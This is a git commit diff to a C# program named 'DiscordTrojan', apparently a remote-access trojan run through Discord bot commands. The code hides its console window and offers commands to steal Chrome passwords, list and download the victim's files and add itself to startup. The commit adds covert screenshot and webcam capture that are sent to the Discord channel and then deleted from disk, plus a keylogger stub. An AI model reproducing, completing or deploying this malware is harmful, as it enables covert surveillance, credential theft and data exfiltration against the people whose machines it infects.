7eebb58929b8c528f76987d9809e49ef61c57967
Hugo <54809176+HUGOW04@users.noreply.github.com>
2022-06-24 11:20:27 +0200

    uptate1.0

--- DiscordTrojan/Program.cs
+++ DiscordTrojan/Program.cs
@@ -9,10 +9,15 @@ using System.Runtime.InteropServices;
 using System.Net;
 using System.Net.Sockets;
 using System.IO;
+using AForge.Video;
+using AForge.Video.DirectShow;
+using System.Threading;
+
 
 
 namespace DiscordTrojan
 {
+    
     public class Program
     {
 
@@ -20,16 +25,29 @@ namespace DiscordTrojan
         static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
+
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+        string root = @"\AppData\LocalLow";
+
+
+
 
         public static void Main(string[] args)
         => new Program().MainAsync().GetAwaiter().GetResult();
 
+
+
+
+
         private DiscordSocketClient _client;
 
-        public async Task MainAsync()
-        {
+        
 
+
+        public async Task MainAsync()
+        {         
             const int SW_HIDE = 0;
             //const int SW_SHOW = 5;
             var handle = GetConsoleWindow();
@@ -68,15 +86,17 @@ namespace DiscordTrojan
             {
                 var help = new EmbedBuilder();
                 help.WithTitle("Help");
-                help.WithDescription("!ping - pong\n\n!get desktop - show photo of desktop\n\n!get chrome passwords - returns a enycrypted password sheat\n\n!get info - shows basic info about the pc and network\n\n!send messagebox (message) - sends the user a message box\n\n!get files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!get file (directory) - returns the file you want to download\n\n!send startup true/false this will add program to startup if you type true");
+                help.WithDescription("!ping - pong\n\n!ScreenShot - show photo of desktop\n\n!get chrome passwords - returns a enycrypted password sheat\n\n!get info - shows basic info about the pc and network\n\n!send messagebox (message) - sends the user a message box\n\n!get files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!get file (directory) - returns the file you want to download\n\n!send startup true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera");
                 help.WithColor(Discord.Color.Teal);
                 message.Channel.SendMessageAsync("", false, help.Build());
             }
 
-            if (message.Content == "!get desktop")
+            if (message.Content == "!ScreenShot")
             {
                 GetDesktop();
-                message.Channel.SendFileAsync("Capture.jpg");
+                message.Channel.SendFileAsync(userPath + root + "\\Capture.jpg");
+                Thread.Sleep(1000);
+                DeleteFunction(userPath + root + "\\Capture.jpg");
             }
 
             if (message.Content == "!get chrome passwords")
@@ -141,6 +161,20 @@ namespace DiscordTrojan
             }
 
 
+            if (message.Content == "!CameraSnap")
+            {
+                try
+                {
+                    CameraSnap();
+                    message.Channel.SendFileAsync(userPath + root + "\\Capture1.jpg");
+                    Thread.Sleep(1000);
+                    DeleteFunction(userPath + root + "\\Capture1.jpg");
+                }
+                catch
+                {
+
+                }
+            }
             return Task.CompletedTask;
         }
 
@@ -152,8 +186,43 @@ namespace DiscordTrojan
             Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
             Graphics captureGraphics = Graphics.FromImage(captureBitmap);
             captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
-            captureBitmap.Save(@"Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
+            captureBitmap.Save(userPath + root + "\\Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
+            
         }
+
+        void KeyLogger()
+        {
+            while(true)
+            {
+                Thread.Sleep(100);
+                for(int i = 0; i < 255; i++)
+                {
+
+                }
+            }
+        }
+
+        // ************************ CAMERA ********************************
+        void CameraSnap()
+        {
+           Camera camera = new Camera();
+           camera.Show();
+        }
+        void DeleteFunction(string fileNameToDelete = "")
+        {
+            try
+            {
+                if (File.Exists(fileNameToDelete))
+                {
+                    File.Delete(fileNameToDelete);
+                }
+            }
+            catch
+            {
+
+            }
+        }
+        // ****************************************************************
 
         string GetIp()
         {
